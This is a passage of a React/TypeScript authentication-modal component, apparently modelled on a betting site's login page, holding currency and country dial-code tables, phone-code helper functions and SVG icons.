'use client';

import React, { useState, useEffect, useMemo, useRef } from 'react';

export interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialMode?: 'login' | 'register' | 'recovery';
}

// --------------------------------------------------------------------------
// Currencies & Countries
// --------------------------------------------------------------------------
export interface CurrencyItem {
  code: string;
  name: string;
  symbol: string;
  badgeBg: string;
  badgeColor?: string;
  badgeType: 'crypto' | 'fiat';
}

export const CURRENCIES: CurrencyItem[] = [
  { code: 'INR', name: 'Indian rupee', symbol: '₹', badgeBg: '#008236', badgeColor: '#fd5e00', badgeType: 'fiat' },
  { code: '1WIN', name: '1win Token', symbol: '1WIN', badgeBg: '#d7a13d', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BCH', name: 'Bitcoin Cash', symbol: 'BCH', badgeBg: '#0ac18e', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BNB', name: 'Binance coin', symbol: 'BNB', badgeBg: '#f3ba2f', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BTC', name: 'Bitcoin', symbol: 'BTC', badgeBg: '#f7931a', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'DASH', name: 'Dash', symbol: 'DASH', badgeBg: '#008de4', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'DOGE', name: 'Dogecoin', symbol: 'DOGE', badgeBg: '#c2a633', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'ETC', name: 'Ethereum Classic', symbol: 'ETC', badgeBg: '#1f1f1f', badgeColor: '#10b981', badgeType: 'crypto' },
  { code: 'ETH', name: 'Ethereum', symbol: 'ETH', badgeBg: '#627eea', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'HYPE', name: 'Hype', symbol: 'HYPE', badgeBg: '#0b3c37', badgeColor: '#00e5a3', badgeType: 'crypto' },
  { code: 'LINK', name: 'Chainlink', symbol: 'LINK', badgeBg: '#375bd2', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'LTC', name: 'Litecoin', symbol: 'LTC', badgeBg: '#bebebe', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'USD', name: 'US Dollar', symbol: '$', badgeBg: '#10b981', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'EUR', name: 'Euro', symbol: '€', badgeBg: '#2563eb', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'USDT', name: 'Tether (USDT)', symbol: '₮', badgeBg: '#26a17b', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'TRX', name: 'TRON', symbol: 'TRX', badgeBg: '#ef4444', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BDT', name: 'Bangladeshi Taka', symbol: '৳', badgeBg: '#059669', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'PKR', name: 'Pakistani Rupee', symbol: '₨', badgeBg: '#15803d', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'AED', name: 'UAE Dirham', symbol: 'د.إ', badgeBg: '#0d9488', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'RUB', name: 'Russian Ruble', symbol: '₽', badgeBg: '#3b82f6', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'BRL', name: 'Brazilian Real', symbol: 'R$', badgeBg: '#16a34a', badgeColor: '#ffffff', badgeType: 'fiat' },
];

export interface CountryItem {
  code: string;
  name: string;
  flag: string;
  searchStr: string;
}

export const COUNTRIES: CountryItem[] = [
  { code: '+91', name: 'India', flag: '🇮🇳', searchStr: 'india +91' },
  { code: '+1', name: 'United States', flag: '🇺🇸', searchStr: 'united states usa america +1' },
  { code: '+44', name: 'United Kingdom', flag: '🇬🇧', searchStr: 'united kingdom uk britain england +44' },
  { code: '+7', name: 'Russia (Россия)', flag: '🇷🇺', searchStr: 'russia россия +7' },
  { code: '+971', name: 'United Arab Emirates', flag: '🇦🇪', searchStr: 'united arab emirates uae dubai +971' },
  { code: '+93', name: 'Afghanistan', flag: '🇦🇫', searchStr: 'afghanistan +93' },
  { code: '+355', name: 'Albania', flag: '🇦🇱', searchStr: 'albania +355' },
  { code: '+213', name: 'Algeria', flag: '🇩🇿', searchStr: 'algeria +213' },
  { code: '+1684', name: 'American Samoa', flag: '🇦🇸', searchStr: 'american samoa +1684' },
  { code: '+376', name: 'Andorra', flag: '🇦🇩', searchStr: 'andorra +376' },
  { code: '+244', name: 'Angola', flag: '🇦🇴', searchStr: 'angola +244' },
  { code: '+1264', name: 'Anguilla', flag: '🇦🇮', searchStr: 'anguilla +1264' },
  { code: '+1268', name: 'Antigua and Barbuda', flag: '🇦🇬', searchStr: 'antigua and barbuda +1268' },
  { code: '+54', name: 'Argentina', flag: '🇦🇷', searchStr: 'argentina +54' },
  { code: '+374', name: 'Armenia (Հայաստան)', flag: '🇦🇲', searchStr: 'armenia հայաստան +374' },
  { code: '+297', name: 'Aruba', flag: '🇦🇼', searchStr: 'aruba +297' },
  { code: '+61', name: 'Australia', flag: '🇦🇺', searchStr: 'australia +61' },
  { code: '+43', name: 'Austria', flag: '🇦🇹', searchStr: 'austria +43' },
  { code: '+994', name: 'Azerbaijan', flag: '🇦🇿', searchStr: 'azerbaijan +994' },
  { code: '+1242', name: 'Bahamas', flag: '🇧🇸', searchStr: 'bahamas +1242' },
  { code: '+973', name: 'Bahrain', flag: '🇧🇭', searchStr: 'bahrain +973' },
  { code: '+880', name: 'Bangladesh', flag: '🇧🇩', searchStr: 'bangladesh +880' },
  { code: '+1246', name: 'Barbados', flag: '🇧🇧', searchStr: 'barbados +1246' },
  { code: '+375', name: 'Belarus', flag: '🇧🇾', searchStr: 'belarus +375' },
  { code: '+32', name: 'Belgium', flag: '🇧🇪', searchStr: 'belgium +32' },
  { code: '+501', name: 'Belize', flag: '🇧🇿', searchStr: 'belize +501' },
  { code: '+229', name: 'Benin', flag: '🇧🇯', searchStr: 'benin +229' },
  { code: '+1441', name: 'Bermuda', flag: '🇧🇲', searchStr: 'bermuda +1441' },
  { code: '+975', name: 'Bhutan', flag: '🇧🇹', searchStr: 'bhutan +975' },
  { code: '+591', name: 'Bolivia', flag: '🇧🇴', searchStr: 'bolivia +591' },
  { code: '+387', name: 'Bosnia and Herzegovina', flag: '🇧🇦', searchStr: 'bosnia and herzegovina +387' },
  { code: '+267', name: 'Botswana', flag: '🇧🇼', searchStr: 'botswana +267' },
  { code: '+55', name: 'Brazil', flag: '🇧🇷', searchStr: 'brazil +55' },
  { code: '+673', name: 'Brunei', flag: '🇧🇳', searchStr: 'brunei +673' },
  { code: '+359', name: 'Bulgaria', flag: '🇧🇬', searchStr: 'bulgaria +359' },
  { code: '+226', name: 'Burkina Faso', flag: '🇧🇫', searchStr: 'burkina faso +226' },
  { code: '+257', name: 'Burundi', flag: '🇧🇮', searchStr: 'burundi +257' },
  { code: '+855', name: 'Cambodia', flag: '🇰🇭', searchStr: 'cambodia +855' },
  { code: '+237', name: 'Cameroon', flag: '🇨🇲', searchStr: 'cameroon +237' },
  { code: '+1', name: 'Canada', flag: '🇨🇦', searchStr: 'canada +1' },
  { code: '+238', name: 'Cape Verde', flag: '🇨🇻', searchStr: 'cape verde +238' },
  { code: '+1345', name: 'Cayman Islands', flag: '🇰🇾', searchStr: 'cayman islands +1345' },
  { code: '+236', name: 'Central African Republic', flag: '🇨🇫', searchStr: 'central african republic +236' },
  { code: '+235', name: 'Chad', flag: '🇹🇩', searchStr: 'chad +235' },
  { code: '+56', name: 'Chile', flag: '🇨🇱', searchStr: 'chile +56' },
  { code: '+86', name: 'China', flag: '🇨🇳', searchStr: 'china +86' },
  { code: '+57', name: 'Colombia', flag: '🇨🇴', searchStr: 'colombia +57' },
  { code: '+269', name: 'Comoros', flag: '🇰🇲', searchStr: 'comoros +269' },
  { code: '+242', name: 'Congo', flag: '🇨🇬', searchStr: 'congo +242' },
  { code: '+243', name: 'Congo (DRC)', flag: '🇨🇩', searchStr: 'congo drc +243' },
  { code: '+506', name: 'Costa Rica', flag: '🇨🇷', searchStr: 'costa rica +506' },
  { code: '+385', name: 'Croatia', flag: '🇭🇷', searchStr: 'croatia +385' },
  { code: '+53', name: 'Cuba', flag: '🇨🇺', searchStr: 'cuba +53' },
  { code: '+357', name: 'Cyprus', flag: '🇨🇾', searchStr: 'cyprus +357' },
  { code: '+420', name: 'Czech Republic', flag: '🇨🇿', searchStr: 'czech republic czechia +420' },
  { code: '+45', name: 'Denmark', flag: '🇩🇰', searchStr: 'denmark +45' },
  { code: '+253', name: 'Djibouti', flag: '🇩🇯', searchStr: 'djibouti +253' },
  { code: '+1767', name: 'Dominica', flag: '🇩🇲', searchStr: 'dominica +1767' },
  { code: '+1809', name: 'Dominican Republic', flag: '🇩🇴', searchStr: 'dominican republic +1809' },
  { code: '+593', name: 'Ecuador', flag: '🇪🇨', searchStr: 'ecuador +593' },
  { code: '+20', name: 'Egypt', flag: '🇪🇬', searchStr: 'egypt +20' },
  { code: '+503', name: 'El Salvador', flag: '🇸🇻', searchStr: 'el salvador +503' },
  { code: '+240', name: 'Equatorial Guinea', flag: '🇬🇶', searchStr: 'equatorial guinea +240' },
  { code: '+291', name: 'Eritrea', flag: '🇪🇷', searchStr: 'eritrea +291' },
  { code: '+372', name: 'Estonia', flag: '🇪🇪', searchStr: 'estonia +372' },
  { code: '+268', name: 'Eswatini', flag: '🇸🇿', searchStr: 'eswatini swaziland +268' },
  { code: '+251', name: 'Ethiopia', flag: '🇪🇹', searchStr: 'ethiopia +251' },
  { code: '+679', name: 'Fiji', flag: '🇫🇯', searchStr: 'fiji +679' },
  { code: '+358', name: 'Finland', flag: '🇫🇮', searchStr: 'finland +358' },
  { code: '+33', name: 'France', flag: '🇫🇷', searchStr: 'france +33' },
  { code: '+241', name: 'Gabon', flag: '🇬🇦', searchStr: 'gabon +241' },
  { code: '+220', name: 'Gambia', flag: '🇬🇲', searchStr: 'gambia +220' },
  { code: '+995', name: 'Georgia', flag: '🇬🇪', searchStr: 'georgia +995' },
  { code: '+49', name: 'Germany', flag: '🇩🇪', searchStr: 'germany +49' },
  { code: '+233', name: 'Ghana', flag: '🇬🇭', searchStr: 'ghana +233' },
  { code: '+30', name: 'Greece', flag: '🇬🇷', searchStr: 'greece +30' },
  { code: '+1473', name: 'Grenada', flag: '🇬🇩', searchStr: 'grenada +1473' },
  { code: '+502', name: 'Guatemala', flag: '🇬🇹', searchStr: 'guatemala +502' },
  { code: '+224', name: 'Guinea', flag: '🇬🇳', searchStr: 'guinea +224' },
  { code: '+245', name: 'Guinea-Bissau', flag: '🇬🇼', searchStr: 'guinea-bissau +245' },
  { code: '+592', name: 'Guyana', flag: '🇬🇾', searchStr: 'guyana +592' },
  { code: '+509', name: 'Haiti', flag: '🇭🇹', searchStr: 'haiti +509' },
  { code: '+504', name: 'Honduras', flag: '🇭🇳', searchStr: 'honduras +504' },
  { code: '+852', name: 'Hong Kong', flag: '🇭🇰', searchStr: 'hong kong +852' },
  { code: '+36', name: 'Hungary', flag: '🇭🇺', searchStr: 'hungary +36' },
  { code: '+354', name: 'Iceland', flag: '🇮🇸', searchStr: 'iceland +354' },
  { code: '+62', name: 'Indonesia', flag: '🇮🇩', searchStr: 'indonesia +62' },
  { code: '+98', name: 'Iran', flag: '🇮🇷', searchStr: 'iran +98' },
  { code: '+964', name: 'Iraq', flag: '🇮🇶', searchStr: 'iraq +964' },
  { code: '+353', name: 'Ireland', flag: '🇮🇪', searchStr: 'ireland +353' },
  { code: '+972', name: 'Israel', flag: '🇮🇱', searchStr: 'israel +972' },
  { code: '+39', name: 'Italy', flag: '🇮🇹', searchStr: 'italy +39' },
  { code: '+225', name: 'Ivory Coast', flag: '🇨🇮', searchStr: 'ivory coast cote divoire +225' },
  { code: '+1876', name: 'Jamaica', flag: '🇯🇲', searchStr: 'jamaica +1876' },
  { code: '+81', name: 'Japan', flag: '🇯🇵', searchStr: 'japan +81' },
  { code: '+962', name: 'Jordan', flag: '🇯🇴', searchStr: 'jordan +962' },
  { code: '+7', name: 'Kazakhstan', flag: '🇰🇿', searchStr: 'kazakhstan +7' },
  { code: '+254', name: 'Kenya', flag: '🇰🇪', searchStr: 'kenya +254' },
  { code: '+965', name: 'Kuwait', flag: '🇰🇼', searchStr: 'kuwait +965' },
  { code: '+996', name: 'Kyrgyzstan', flag: '🇰🇬', searchStr: 'kyrgyzstan +996' },
  { code: '+856', name: 'Laos', flag: '🇱🇦', searchStr: 'laos +856' },
  { code: '+371', name: 'Latvia', flag: '🇱🇻', searchStr: 'latvia +371' },
  { code: '+961', name: 'Lebanon', flag: '🇱🇧', searchStr: 'lebanon +961' },
  { code: '+266', name: 'Lesotho', flag: '🇱🇸', searchStr: 'lesotho +266' },
  { code: '+231', name: 'Liberia', flag: '🇱🇷', searchStr: 'liberia +231' },
  { code: '+218', name: 'Libya', flag: '🇱🇾', searchStr: 'libya +218' },
  { code: '+423', name: 'Liechtenstein', flag: '🇱🇮', searchStr: 'liechtenstein +423' },
  { code: '+370', name: 'Lithuania', flag: '🇱🇹', searchStr: 'lithuania +370' },
  { code: '+352', name: 'Luxembourg', flag: '🇱🇺', searchStr: 'luxembourg +352' },
  { code: '+853', name: 'Macau', flag: '🇲🇴', searchStr: 'macau +853' },
  { code: '+261', name: 'Madagascar', flag: '🇲🇬', searchStr: 'madagascar +261' },
  { code: '+265', name: 'Malawi', flag: '🇲🇼', searchStr: 'malawi +265' },
  { code: '+60', name: 'Malaysia', flag: '🇲🇾', searchStr: 'malaysia +60' },
  { code: '+960', name: 'Maldives', flag: '🇲🇻', searchStr: 'maldives +960' },
  { code: '+223', name: 'Mali', flag: '🇲🇱', searchStr: 'mali +223' },
  { code: '+356', name: 'Malta', flag: '🇲🇹', searchStr: 'malta +356' },
  { code: '+222', name: 'Mauritania', flag: '🇲🇷', searchStr: 'mauritania +222' },
  { code: '+230', name: 'Mauritius', flag: '🇲🇺', searchStr: 'mauritius +230' },
  { code: '+52', name: 'Mexico', flag: '🇲🇽', searchStr: 'mexico +52' },
  { code: '+373', name: 'Moldova', flag: '🇲🇩', searchStr: 'moldova +373' },
  { code: '+377', name: 'Monaco', flag: '🇲🇨', searchStr: 'monaco +377' },
  { code: '+976', name: 'Mongolia', flag: '🇲🇳', searchStr: 'mongolia +976' },
  { code: '+382', name: 'Montenegro', flag: '🇲🇪', searchStr: 'montenegro +382' },
  { code: '+212', name: 'Morocco', flag: '🇲🇦', searchStr: 'morocco +212' },
  { code: '+258', name: 'Mozambique', flag: '🇲🇿', searchStr: 'mozambique +258' },
  { code: '+95', name: 'Myanmar', flag: '🇲🇲', searchStr: 'myanmar burma +95' },
  { code: '+264', name: 'Namibia', flag: '🇳🇦', searchStr: 'namibia +264' },
  { code: '+977', name: 'Nepal', flag: '🇳🇵', searchStr: 'nepal +977' },
  { code: '+31', name: 'Netherlands', flag: '🇳🇱', searchStr: 'netherlands +31' },
  { code: '+64', name: 'New Zealand', flag: '🇳🇿', searchStr: 'new zealand +64' },
  { code: '+505', name: 'Nicaragua', flag: '🇳🇮', searchStr: 'nicaragua +505' },
  { code: '+227', name: 'Niger', flag: '🇳🇪', searchStr: 'niger +227' },
  { code: '+234', name: 'Nigeria', flag: '🇳🇬', searchStr: 'nigeria +234' },
  { code: '+850', name: 'North Korea', flag: '🇰🇵', searchStr: 'north korea +850' },
  { code: '+389', name: 'North Macedonia', flag: '🇲🇰', searchStr: 'north macedonia +389' },
  { code: '+47', name: 'Norway', flag: '🇳🇴', searchStr: 'norway +47' },
  { code: '+968', name: 'Oman', flag: '🇴🇲', searchStr: 'oman +968' },
  { code: '+92', name: 'Pakistan', flag: '🇵🇰', searchStr: 'pakistan +92' },
  { code: '+970', name: 'Palestine', flag: '🇵🇸', searchStr: 'palestine +970' },
  { code: '+507', name: 'Panama', flag: '🇵🇦', searchStr: 'panama +507' },
  { code: '+675', name: 'Papua New Guinea', flag: '🇵🇬', searchStr: 'papua new guinea +675' },
  { code: '+595', name: 'Paraguay', flag: '🇵🇾', searchStr: 'paraguay +595' },
  { code: '+51', name: 'Peru', flag: '🇵🇪', searchStr: 'peru +51' },
  { code: '+63', name: 'Philippines', flag: '🇵🇭', searchStr: 'philippines +63' },
  { code: '+48', name: 'Poland', flag: '🇵🇱', searchStr: 'poland +48' },
  { code: '+351', name: 'Portugal', flag: '🇵🇹', searchStr: 'portugal +351' },
  { code: '+1787', name: 'Puerto Rico', flag: '🇵🇷', searchStr: 'puerto rico +1787' },
  { code: '+974', name: 'Qatar', flag: '🇶🇦', searchStr: 'qatar +974' },
  { code: '+40', name: 'Romania', flag: '🇷🇴', searchStr: 'romania +40' },
  { code: '+250', name: 'Rwanda', flag: '🇷🇼', searchStr: 'rwanda +250' },
  { code: '+966', name: 'Saudi Arabia', flag: '🇸🇦', searchStr: 'saudi arabia +966' },
  { code: '+221', name: 'Senegal', flag: '🇸🇳', searchStr: 'senegal +221' },
  { code: '+381', name: 'Serbia', flag: '🇷🇸', searchStr: 'serbia +381' },
  { code: '+248', name: 'Seychelles', flag: '🇸🇨', searchStr: 'seychelles +248' },
  { code: '+232', name: 'Sierra Leone', flag: '🇸🇱', searchStr: 'sierra leone +232' },
  { code: '+65', name: 'Singapore', flag: '🇸🇬', searchStr: 'singapore +65' },
  { code: '+421', name: 'Slovakia', flag: '🇸🇰', searchStr: 'slovakia +421' },
  { code: '+386', name: 'Slovenia', flag: '🇸🇮', searchStr: 'slovenia +386' },
  { code: '+252', name: 'Somalia', flag: '🇸🇴', searchStr: 'somalia +252' },
  { code: '+27', name: 'South Africa', flag: '🇿🇦', searchStr: 'south africa +27' },
  { code: '+82', name: 'South Korea', flag: '🇰🇷', searchStr: 'south korea +82' },
  { code: '+211', name: 'South Sudan', flag: '🇸🇸', searchStr: 'south sudan +211' },
  { code: '+34', name: 'Spain', flag: '🇪🇸', searchStr: 'spain +34' },
  { code: '+94', name: 'Sri Lanka', flag: '🇱🇰', searchStr: 'sri lanka +94' },
  { code: '+249', name: 'Sudan', flag: '🇸🇩', searchStr: 'sudan +249' },
  { code: '+597', name: 'Suriname', flag: '🇸🇷', searchStr: 'suriname +597' },
  { code: '+46', name: 'Sweden', flag: '🇸🇪', searchStr: 'sweden +46' },
  { code: '+41', name: 'Switzerland', flag: '🇨🇭', searchStr: 'switzerland +41' },
  { code: '+963', name: 'Syria', flag: '🇸🇾', searchStr: 'syria +963' },
  { code: '+886', name: 'Taiwan', flag: '🇹🇼', searchStr: 'taiwan +886' },
  { code: '+992', name: 'Tajikistan', flag: '🇹🇯', searchStr: 'tajikistan +992' },
  { code: '+255', name: 'Tanzania', flag: '🇹🇿', searchStr: 'tanzania +255' },
  { code: '+66', name: 'Thailand', flag: '🇹🇭', searchStr: 'thailand +66' },
  { code: '+228', name: 'Togo', flag: '🇹🇬', searchStr: 'togo +228' },
  { code: '+1868', name: 'Trinidad and Tobago', flag: '🇹🇹', searchStr: 'trinidad and tobago +1868' },
  { code: '+216', name: 'Tunisia', flag: '🇹🇳', searchStr: 'tunisia +216' },
  { code: '+90', name: 'Turkey', flag: '🇹🇷', searchStr: 'turkey +90' },
  { code: '+993', name: 'Turkmenistan', flag: '🇹🇲', searchStr: 'turkmenistan +993' },
  { code: '+256', name: 'Uganda', flag: '🇺🇬', searchStr: 'uganda +256' },
  { code: '+380', name: 'Ukraine (Україна)', flag: '🇺🇦', searchStr: 'ukraine україна +380' },
  { code: '+598', name: 'Uruguay', flag: '🇺🇾', searchStr: 'uruguay +598' },
  { code: '+998', name: 'Uzbekistan', flag: '🇺🇿', searchStr: 'uzbekistan +998' },
  { code: '+58', name: 'Venezuela', flag: '🇻🇪', searchStr: 'venezuela +58' },
  { code: '+84', name: 'Vietnam', flag: '🇻🇳', searchStr: 'vietnam +84' },
  { code: '+967', name: 'Yemen', flag: '🇾🇪', searchStr: 'yemen +967' },
  { code: '+260', name: 'Zambia', flag: '🇿🇲', searchStr: 'zambia +260' },
  { code: '+263', name: 'Zimbabwe', flag: '🇿🇼', searchStr: 'zimbabwe +263' },
];

const COUNTRIES_BY_CODE_DESC = [...COUNTRIES].sort((a, b) => b.code.length - a.code.length);

function findCountryByPhoneInput(val: string): CountryItem | null {
  const trimmed = val.trimStart();
  if (!trimmed) return null;
  const normalized = trimmed.startsWith('+') ? trimmed : `+${trimmed}`;
  const spaceIdx = normalized.indexOf(' ');
  if (spaceIdx !== -1) {
    const codePart = normalized.slice(0, spaceIdx);
    const exact = COUNTRIES_BY_CODE_DESC.find((c) => c.code === codePart);
    if (exact) return exact;
  }
  const digitsOnly = normalized.match(/^\+\d{1,4}/)?.[0];
  if (!digitsOnly) return null;
  return COUNTRIES_BY_CODE_DESC.find((c) => digitsOnly.startsWith(c.code)) || null;
}

function replaceDialCode(currentVal: string, oldCode: string, newCode: string): string {
  const trimmed = currentVal.trimStart();
  if (!trimmed) return `${newCode}  `;
  if (trimmed.startsWith(oldCode)) {
    const rest = trimmed.slice(oldCode.length).trimStart();
    return rest ? `${newCode}  ${rest}` : `${newCode}  `;
  }
  const match = trimmed.match(/^\+\d{1,4}\s*(.*)$/);
  if (match) {
    const rest = match[1].trimStart();
    return rest ? `${newCode}  ${rest}` : `${newCode}  `;
  }
  return `${newCode}  ${trimmed}`;
}

// --------------------------------------------------------------------------
// Icons from rawData/login-page/index.html
// --------------------------------------------------------------------------
function ArrowLeftIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" role="presentation" className="icon-base_root-g9fLa icon-base_m-g9fLa modal-header_closeIcon-7NUzE" width="24" height="24" data-icon="arrow-left">
      <path fillRule="evenodd" d="M10.97 2.697a.9.9 0 0 1 0 1.273L6.94 8l4.03 4.03a.9.9 0 1 1-1.273 1.273L4.697 8.637a.9.9 0 0 1 0-1.273l5-5a.9.9 0 0 1 1.273 0" clipRule="evenodd" />
    </svg>
  );
}

function CloseIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" role="presentation" className="icon-base_root-g9fLa icon-base_m-g9fLa modal-header_closeIcon-7NUzE" width="24" height="24" data-icon="close">
      <path fillRule="evenodd" d="M3.364 3.364a.9.9 0 0 1 1.272 0L8 6.727l3.364-3.363a.9.9 0 0 1 1.272 1.272L9.274 8l3.364 3.364a.9.9 0 1 1-1.273 1.272L8 9.274l-3.364 3.364a.9.9 0 1 1-1.272-1.273L6.727 8 3.364 4.636a.9.9 0 0 1 0-1.272" clipRule="evenodd" />
    </svg>
  );
}

function PhoneIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" role="presentation" className="icon-base_root-g9fLa icon-base_m-g9fLa" width="24" height="24" data-icon="call">
      <g clipPath="url(#call_e7a4be__a)">
        <path fillRule="evenodd" d="M7.606 8.398c3.359 3.358 4.121-.527 6.26 1.61 2.062 2.062 3.247 2.475.634 5.087-.327.262-2.406 3.426-9.713-3.878C-2.521 3.91.641 1.829.904 1.502c2.62-2.619 3.025-1.427 5.087.635C8.13 4.275 4.246 5.04 7.606 8.397" clipRule="evenodd" />
      </g>
      <defs>
        <clipPath id="call_e7a4be__a">
          <path fill="#fff" d="M0 0h16v16H0z" />
        </clipPath>
      </defs>
    </svg>
  );
}

function EmailIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" role="presentation" className="icon-base_root-g9fLa icon-base_m-g9fLa" width="24" height="24" data-icon="email">
      <path fillRule="evenodd" d="M14.815 1.985A4.05 4.05 0 0 0 11.951.8H4.048A4.04 4.04 0 0 0 0 4.84v6.044C0 13.116 1.815 15.2 4.048 15.2h7.903c2.233 0 4.049-2.084 4.049-4.316V4.84a4.03 4.03 0 0 0-1.185-2.855M3.583 5.577a.64.64 0 1 0-.816.987L6.065 9.29a3.04 3.04 0 0 0 3.876 0l3.292-2.726a.64.64 0 1 0-.816-.986L9.124 8.303a1.76 1.76 0 0 1-2.243 0z" clipRule="evenodd" />
    </svg>
  );
}

function ArrowBottomIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" role="presentation" className="icon-base_root-g9fLa icon-base_m-g9fLa" width="24" height="24" data-icon="arrow-bottom">
      <path fillRule="evenodd" d="M2.697 5.03a.9.9 0 0 1 1.273 0L8 9.06l4.03-4.03a.9.9 0 1 1 1.273 1.273L8.637 10.97a.9.9 0 0 1-1.273 0L2.697 6.303a.9.9 0 0 1 0-1.273" clipRule="evenodd" />
    </svg>
  );
}

function LockIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" role="presentation" className="icon-base_root-g9fLa" width="16" height="16" icon-size="s" data-icon="lock">
      <path fillRule="evenodd" d="M2.165 6.579q-.262.297-.436.656-.048.101-.086.206c-.2.557-.2 1.242-.2 2.47V12.3c.007.979.045 1.546.28 2.046l.005.011a2.9 2.9 0 0 0 1.363 1.356c.518.252 1.115.284 2.184.287l.489.001h4.472l.642-.001c.973-.007 1.537-.047 2.031-.287q.105-.05.208-.109c.494-.285.9-.722 1.154-1.247l.005-.011c.21-.448.264-.95.277-1.75.004-.268.004-.57.004-.916V9.912q0-.417-.002-.757c-.008-.776-.043-1.283-.198-1.714a2 2 0 0 0-.086-.206 2.944 2.944 0 0 0-1.392-1.378 2.5 2.5 0 0 0-.578-.175V4.28a4.3 4.3 0 0 0-.21-1.299 1 1 0 0 0-.025-.09A4.28 4.28 0 0 0 9.876.432a4.28 4.28 0 0 0-3.752 0 4.28 4.28 0 0 0-2.19 2.457 1 1 0 0 0-.025.091c-.135.413-.208.85-.21 1.3v1.4a2.5 2.5 0 0 0-.614.193 2.9 2.9 0 0 0-.92.705m3.599-.988q-.456 0-.822.003v-1.31A3.067 3.067 0 0 1 8 1.245a3.064 3.064 0 0 1 3.057 3.04v1.309q-.365-.004-.82-.003zM8.64 9.94a.64.64 0 0 0-1.28 0v1.778a.64.64 0 1 0 1.28 0z" clipRule="evenodd" />
    </svg>
  );
}

function SearchIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
      <circle cx="11" cy="11" r="8" />
      <path d="M21 21l-4.35-4.35" />
    </svg>
  );
}

function GoogleIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" role="presentation" className="icon-base_root-g9fLa base_icon-HuD6g base_theme-monochrome-HuD6g base_default-HuD6g" width="36" height="36" data-icon="google">
      <g className="google_7e5e22__color">
        <path fill="#f1f1f1" d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <path fill="#4285f4" d="M28 18.23c0-.68-.056-1.363-.176-2.032h-9.622v3.85h5.51a4.62 4.62 0 0 1-2.04 3.04v2.498h3.288C26.89 23.844 28 21.272 28 18.23" />
        <path fill="#34a853" d="M18.201 28c2.751 0 5.072-.886 6.762-2.414l-3.287-2.499c-.915.61-2.095.956-3.471.956-2.661 0-4.918-1.76-5.728-4.127H9.085v2.576C10.817 25.869 14.344 28 18.201 28" />
        <path fill="#fbbc04" d="M12.474 19.917a5.88 5.88 0 0 1 0-3.829v-2.575H9.085a9.83 9.83 0 0 0 0 8.98z" />
        <path fill="#ea4335" d="M18.201 11.958a5.6 5.6 0 0 1 3.913 1.5l2.913-2.856A9.91 9.91 0 0 0 18.2 8.001c-3.857 0-7.384 2.131-9.116 5.511l3.388 2.576c.806-2.37 3.067-4.13 5.728-4.13" />
      </g>
      <g className="google_7e5e22__monochrome">
        <path d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <g clipPath="url(#google_7e5e22__a)">
          <path fill="currentColor" d="M22.114 13.457a5.6 5.6 0 0 0-3.913-1.499c-2.66 0-4.92 1.76-5.727 4.129v.001a5.88 5.88 0 0 0 0 3.828h.003c.81 2.367 3.066 4.127 5.728 4.127 1.374 0 2.554-.345 3.468-.954v-.002a4.62 4.62 0 0 0 2.039-3.038h-5.51v-3.85h9.622c.12.668.176 1.351.176 2.031 0 3.041-1.109 5.613-3.038 7.354l.001.002C23.273 27.114 20.953 28 18.201 28c-3.857 0-7.384-2.131-9.116-5.508a9.83 9.83 0 0 1 0-8.98c1.732-3.38 5.259-5.511 9.116-5.511a9.91 9.91 0 0 1 6.826 2.601z" />
        </g>
        <defs>
          <clipPath id="google_7e5e22__a">
            <path d="M8 8h20v20H8z" />
          </clipPath>
        </defs>
      </g>
    </svg>
  );
}

function VkIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" role="presentation" className="icon-base_root-g9fLa base_icon-HuD6g base_theme-monochrome-HuD6g base_default-HuD6g" width="36" height="36" data-icon="vk">
      <g className="vk_090179__color">
